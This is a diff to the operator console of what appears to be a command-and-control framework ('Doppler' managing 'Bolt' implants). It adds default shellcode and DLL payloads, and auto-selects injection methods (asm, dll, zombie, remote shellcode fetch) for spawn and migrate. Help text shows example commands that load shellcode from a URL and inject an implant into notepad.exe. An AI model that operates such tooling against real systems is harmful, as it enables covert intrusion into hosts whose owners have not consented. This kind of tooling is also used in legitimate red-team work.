@@ -142,7 +142,6 @@ listener <Listener Name>
 """
 _HELP_MAIN_LS = """"""
 
-
 HELP_TEXT = [
     _HELP_MAIN,
     "Bolts",
@@ -175,6 +174,7 @@ _DONE = [
 ]
 _EMPTY = list()
 _TOGGLES = ["enable", "disable"]
+_AUTO_TYPES = ["asm", "dll", "zombie"]
 
 
 def _ex(v):
@@ -334,18 +334,6 @@ def _strip_rn(v):
     return v
 
 
-def _should_nl():
-    # NOTE(dij): This is kinda borked atm?
-    # TODO(dij): Fix this.
-    return "\n"
-    # try:
-    #    if len(get_line_buffer()) == 0:
-    #        return ""
-    # except Exception:
-    #    pass
-    # return "\n"
-
-
 def _split_list(v):
     if not nes(v):
         return None
@@ -372,6 +360,26 @@ def _split_list(v):
             r.append(i)
     del e
     return list(set(r))
+
+
+def _shell_split(v):
+    z = shlex(v, punctuation_chars=True)
+    z.commenters = ""
+    z.wordchars += ":;|$&!@%^()[]{}\\<>,+"
+    v = list(z)
+    del z
+    if len(v) <= 2:
+        return v
+    # NOTE(dij): Remove '"' when supplied in the string since 9/10 we are using
+    #            a string with a space. However, we won't strip single quotes (')
+    #            so users can override this behavior.
+    #
+    #            Checks for >2 to ignore long commands
+    for x in range(0, len(v)):
+        if len(v[x]) == 0 or v[x][0] != '"' or v[x][-1] != '"':
+            continue
+        v[x] = v[x][1:-1]
+    return v
 
 
 def _is_match(m, v):
@@ -476,13 +484,56 @@ def _menu(v, menu, inv=False):
     return r
 
 
-def _get_callable(type, show, r):
+def _valid_name(s, size=0, extra=False):
+    if not isinstance(s, str) or len(s) <= size:
+        return False
+    for i in s:
+        if ord(i) <= 57 and ord(i) >= 48:  # 9 - 0
+            continue
+        if ord(i) <= 90 and ord(i) >= 65:  # Z - A
+            continue
+        if ord(i) <= 122 and ord(i) >= 97:  # z - a
+            continue
+        if not extra:
+            return False
+        if ord(i) == 45 or ord(i) == 46 or ord(i) == 95:  # '-' or '.' or '_'
+            continue
+        return False
+    return True
+
+
+def _get_callable(type, show, r, asm, dll):
     if not nes(r.method):
         if not nes(r.file):
+            if nes(asm) or (nes(dll) and r.reflect):
+                p = {"show": show}
+                if nes(asm):
+                    with open(expanduser(expandvars(asm)), "rb") as f:
+                        p["data"] = b64encode(f.read()).decode("UTF-8")
+                    print(f'[+] Using runtime ASM file "{asm}".')
+                else:
+                    with open(expanduser(expandvars(dll)), "rb") as f:
+                        p["data"] = b64encode(f.read()).decode("UTF-8")
+                    print(f'[+] Using runtime DLL file "{dll}".')
+                if nes(r.args):
+                    p["fake"] = r.args
+                    print('[+] Guessing method "zombie" based on arguments.')
+                    return "zombie", p
+                print('[+] Guessing method "asm" based on arguments.')
+                return "asm", p
+            if nes(dll):
+                p = {"show": show, "reflect": r.reflect}
+                split_path(p, dll)
+                print(f'[+] Using runtime DLL file "{dll}".')
+                print('[+] Guessing method "dll" based on arguments.')
+                return "dll", p
+            print('[+] Guessing method "self" based on arguments.')
             return "", None
         if r.file.lower() == "self":
+            print('[+] Guessing method "self" based on arguments.')
             return "", None
         if r.file.lower().startswith("http") and "://" in r.file:
+            print('[+] Guessing method "pexec" based on arguments.')
             if nes(r.agent):
                 return "pexec", {"url": r.file, "agent": r.agent}
             return "pexec", r.file
@@ -496,11 +547,14 @@ def _get_callable(type, show, r):
             if nes(d):
                 p["domain"] = d
             del u, d
+        print('[+] Guessing method "exec" based on arguments.')
         return "exec", p
     m = r.method.lower()
     if m == "self":
         return "", None
-    if not nes(r.file):
+    if not nes(r.file) and (nes(asm) or nes(dll)) and m not in _AUTO_TYPES:
+        raise ValueError(f"{type}: missing file/command!")
+    elif not nes(r.file) and not nes(asm) and not nes(dll):
         raise ValueError(f"{type}: missing file/command!")
     if m == "url":
         if nes(r.agent):
@@ -520,36 +574,29 @@ def _get_callable(type, show, r):
                 p["domain"] = d
             del u, d
         return "exec", p
+    if m == "dll" and not nes(r.file) and r.reflect and nes(asm):
+        m = "asm"
     if m == "dll":
+        if not nes(r.file) and nes(dll):
+            r.file = dll
+            print(f'[+] Using runtime DLL file "{dll}".')
         p = {"show": show, "reflect": r.reflect}
         split_path(p, r.file)
         return "dll", p
     if m == "asm" or m == "zombie":
         p = {"show": show}
+        if not nes(r.file) and nes(asm):
+            r.file = asm
+            print(f'[+] Using runtime ASM file "{asm}".')
+        if not nes(r.file) and nes(dll):
+            r.file = dll
+            print(f'[+] Using runtime DLL file "{dll}".')
         with open(expanduser(expandvars(r.file)), "rb") as f:
             p["data"] = b64encode(f.read()).decode("UTF-8")
         if m == "zombie":
             p["fake"] = r.args
         return m, p
     raise ValueError(f"{type}: invalid/unguessable method!")
-
-
-def _valid_name(s, size=0, extra=False):
-    if not isinstance(s, str) or len(s) <= size:
-        return False
-    for i in s:
-        if ord(i) <= 57 and ord(i) >= 48:
-            continue
-        if ord(i) <= 90 and ord(i) >= 65:
-            continue
-        if ord(i) <= 122 and ord(i) >= 97:
-            continue
-        if not extra:
-            return False
-        if ord(i) == 45 or ord(i) == 46 or ord(i) == 95:
-            continue
-        return False
-    return True
 
 
 def _print_job_result(id, job, type, res, out, script):
@@ -1006,7 +1053,7 @@ class _MenuMain(object):
     def do_script(self, n):
         if len(n) == 0:
             return self.shell.set_menu(MENU_SCRIPTS)
-        if not _valid_name(n, True):
+        if not _valid_name(n, 1, True):
             return print("script <name>")
         try:
             self.shell.cirrus.script(n)
@@ -1020,7 +1067,7 @@ class _MenuMain(object):
     def do_profile(self, n):
         if len(n) == 0:
             return self.shell.set_menu(MENU_PROFILES)
-        if not _valid_name(n, True):
+        if not _valid_name(n, 1, True):
             return print("profile <name>")
         try:
             self.shell.cirrus.profile(n)
@@ -1049,7 +1096,7 @@ class _MenuMain(object):
     def do_listener(self, n):
         if len(n) == 0:
             return self.shell.set_menu(MENU_LISTENERS)
-        if not _valid_name(n, True):
+        if not _valid_name(n, 1, True):
             return print("listener <name>")
         try:
             self.shell.cirrus.listener(n)
@@ -1900,7 +1947,7 @@ class _MenuBolt(object):
             script script1
             script script_test
         """
-        if not _valid_name(n, True):
+        if not _valid_name(n, 1, True):
             return print("script <name>")
         self._exec(self.shell.cirrus.task_script, name=n)
 
@@ -2152,6 +2199,11 @@ class _MenuBolt(object):
         action can be disable using thr "-z/--no-auto" argument.) The pipe value
         is most likely compiled into the client.
 
+        If any DLL or ASM files are specified using the Doppler command line, the
+        file will be used if no file path is specified. Doppler will perfer the ASM
+        payload over DLL, if specified. If no method is specified, it will default
+        to ASM or DLL if a file is specified.
+
         By default, the current profile will be used, but can be changed by
         specifying the name with the "-n" argument.
 
@@ -2220,7 +2272,7 @@ class _MenuBolt(object):
             spawn pipe-me http://path.to.shell.code
             spawn -m url pipe-me path.to.shell.code
             spawn -p my_profile -m asm ~/bolt.bin
-            spawn -m zombie -a notepad.exe ~/implant.dll
+            spawn -m zombie -f notepad.exe ~/implant.dll
             spawn -m self -u admin -p Password123 derp-me
         """
         if _is_help(a):
@@ -2242,7 +2294,7 @@ class _MenuBolt(object):
         if nes(r.target):
             f = _quick_filter(r.target)
         try:
-            m, c = _get_callable("spawn", self.show, r)
+            m, c = _get_callable("spawn", self.show, r, self.shell.asm, self.shell.dll)
         except (ValueError, OSError) as err:
             return print(f"[!] {err}!")
         self._exec(
@@ -2784,6 +2836,11 @@ class _MenuBolt(object):
         action can be disable using thr "-z/--no-auto" argument.) The pipe value
         is most likely compiled into the client.
 
+        If any DLL or ASM files are specified using the Doppler command line, the
+        file will be used if no file path is specified. Doppler will perfer the ASM
+        payload over DLL, if specified. If no method is specified, it will default
+        to ASM or DLL if a file is specified.
+
         By default, the current profile will be used, but can be changed by
         specifying the name with the "-p" argument.
 
@@ -2852,7 +2909,7 @@ class _MenuBolt(object):
             migrate pipe-me http://path.to.shell.code
             migrate -m url pipe-me path.to.shell.code
             migrate -p my_profile -m asm ~/bolt.bin
-            migrate -m zombie -a notepad.exe ~/implant.dll
+            migrate -m zombie -f notepad.exe ~/implant.dll
             migrate -m self -u admin -p Password123 derp-me
         """
         if _is_help(a):
@@ -2874,7 +2931,9 @@ class _MenuBolt(object):
         if nes(r.target):
             f = _quick_filter(r.target)
         try:
-            m, c = _get_callable("migrate", self.show, r)
+            m, c = _get_callable(
+                "migrate", self.show, r, self.shell.asm, self.shell.dll
+            )
         except (ValueError, OSError) as err:
             return print(f"[!] {err}!")
         self._exec(
@@ -3732,7 +3791,11 @@ class _MenuBolts(object):
             print(f"[!] {err}")
 
     def do_all(self, n):
-        self.shell.set_menu(MENU_BOLT_ALL, n)
+        try:
+            self.shell.set_menu(MENU_BOLT_ALL, n)
+        except ValueError as err:
+            print(f"[!] {err}")
+            self.shell.set_menu(MENU_BOLTS)
 
     def do_info(self, n):
         try:
@@ -5165,6 +5228,10 @@ will ignore the output file argument and will use a generated one instead.
         super(__class__, self).do_download(p, None)
 
     def prompt(self, args=None):
+        if not nes(args):
+            self.matcher = None
+        else:
+            self.matcher = Exp.parse(args)
         print(_MenuBoltAll._PROMPT)
         print("Default execution is ", end="")
         if self.shell.no_default_run:
@@ -5173,16 +5240,15 @@ will ignore the output file argument and will use a generated one instead.
             print("enabled.")
         self.filter = None
         self.results = True
-        if not nes(args):
-            self.matcher = None
+        if self.matcher is None or self.matcher.empty():
             return " > Bolts > [ALL] > "
-        self.matcher = Exp.parse(args)
-        if self.matcher.empty():
-            self.matcher = None
-            return " > Bolts > [ALL] > "
-        print(f'The selected matcher "{self.matcher}", matches the following Bolt(s):')
+        s = self.matcher.matches(self.shell.cirrus.sessions())
+        if len(s) == 0:
+            print(f'[!] The matcher "{self.matcher}", does not match any Bolt(s)\n')
+            return f" > Bolts > [{self.matcher}] > "
+        print(f'The matcher "{self.matcher}", matches the following Bolt(s):')
         print(f'{"ID":9}{"Hostname":20}{"IP":17}{"OS":10}{"User":32}\n{"="*80}')
-        for v in self.matcher.matches(self.shell.cirrus.sessions()):
+        for v in s:
             print(f'{v["id"]:9}', end="")
             u = ""
             if v["device"]["elevated"]:
@@ -5192,10 +5258,14 @@ will ignore the output file argument and will use a generated one instead.
                 u = u[:30] + "~"
             if v["device"]["domain"]:
                 u = u + "@"
-            print(
-                f'{v["device"]["hostname"]:20}{ip_str(v):17}{v["device"]["os"]:10}{u:32}'
-            )
-            del u
+            h = v["device"]["hostname"]
+            if len(h) > 19 and "." in h:
+                h = h.split(".")[0]
+            if len(h) > 19:
+                h = h[:19] + "~"
+            print(f'{h:20}{ip_str(v):17}{v["device"]["os"]:10}{u:32}')
+            del u, h
+        del s
         print()
         return f" > Bolts > [{self.matcher}] > "
 
@@ -5210,6 +5280,8 @@ will ignore the output file argument and will use a generated one instead.
 
 class Shell(Cmd):
     __slots__ = (
+        "dll",
+        "asm",
         "pipe",
         "cache",
         "_init",
@@ -5220,8 +5292,10 @@ class Shell(Cmd):
         "no_default_run",
     )
 
-    def __init__(self, cirrus, no_default_run=False, pipe=None):
+    def __init__(self, cirrus, no_default_run=False, pipe=None, asm=None, dll=None):
         Cmd.__init__(self, stdin=stdin, stdout=stdout, completekey="tab")
+        self.asm = asm
+        self.dll = dll
         self._state = 0
         self.pipe = pipe
         self._init = False
@@ -5243,7 +5317,7 @@ class Shell(Cmd):
             print()
         except Exception as err:
             print(
-                f"{_should_nl()}[!] {err.__class__.__name__} {err}\n{format_exc(5)}",
+                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(5)}",
                 file=stderr,
             )
         self.close()
@@ -5299,7 +5373,7 @@ class Shell(Cmd):
         except Exception as err:
             self.cirrus.close()
             return print(
-                f"{_should_nl()}[!] {err.__class__.__name__} {err}\n{format_exc(4)}",
+                f"\n[!] {err.__class__.__name__} {err}\n{format_exc(4)}",
                 file=stderr,
             )
         if single:
@@ -5463,37 +5537,37 @@ class Shell(Cmd):
                 try:
                     s = self.cirrus.session(id)
                     print(
-                        f"{_should_nl()}New Bolt Registered: {id} "
+                        f"\nNew Bolt Registered: {id} "
                         f'{("*" if s["device"]["elevated"] else "") + s["device"]["user"]}'
                         f" @ {ip_str(s)}"
                     )
                     del s
                 except ValueError:
-                    print(f"{_should_nl()}[*] {msg}", end="")
+                    print(f"\n[*] {msg}", end="")
             self.cache._bolts = None
             if self.cache._jobs is not None and id in self.cache._jobs:
                 del self.cache._jobs[id]
             return
         if a == "session_delete":
             if self._state == MENU_BOLT and self._menu.id == id:
-                print(f"{_should_nl()}[*] {id}: This Bolt was removed or shutdown.")
+                print(f"\n[*] {id}: This Bolt was removed or shutdown.")
             self.cache._bolts, self.cache._jobs = None, None
             return
         if self._state == MENU_BOLT:
             if self._menu.id != id:  # getattr(self._menu, "id") != id:
                 return
             if a == "job_receiving" or a == "job_update" or a == "session_update":
-                return print(f"{_should_nl()}[*] {msg}")
+                return print(f"\n[*] {msg}")
             if a == "job_complete":
                 self.cirrus.job_display(id, job, True)
             return
         # NOTE(dij): Disabeling for now as it can get spammy.
-        # if a == "packet_new" and self._state != MENU_BOLT_ALL:
-        #    return print(f"{_should_nl()}[*] {msg}")
+        if a == "packet_new" and self._state != MENU_BOLT_ALL:
+            return print(f"\n[*] {msg}")
         if self._state != MENU_BOLT_ALL:
             return
         if a == "job_receiving" or a == "job_update" or a == "session_update":
-            return print(f"{_should_nl()}[*] {msg}")
+            return print(f"\n[*] {msg}")
         if a == "job_complete" and self._menu.results:
             return self.cirrus.job_display(id, job, True, True)
 
@@ -5624,11 +5698,7 @@ class Shell(Cmd):
         del c
         if k == 1:
             try:
-                # v = split(a)
-                z = shlex(a, punctuation_chars=True)
-                z.whitespace_split = True
-                v = list(z)
-                del z
+                v = _shell_split(a)
             except ValueError:
                 if y:
                     return f(a, line=n)
@@ -5641,11 +5711,7 @@ class Shell(Cmd):
                 return f(a, line=n)
             return f(a)
         try:
-            # v = split(a)
-            z = shlex(a, punctuation_chars=True)
-            z.whitespace_split = True
-            v = list(z)
-            del z
+            v = _shell_split(a)
         except ValueError:
             if y:
                 return f(a, line=n)
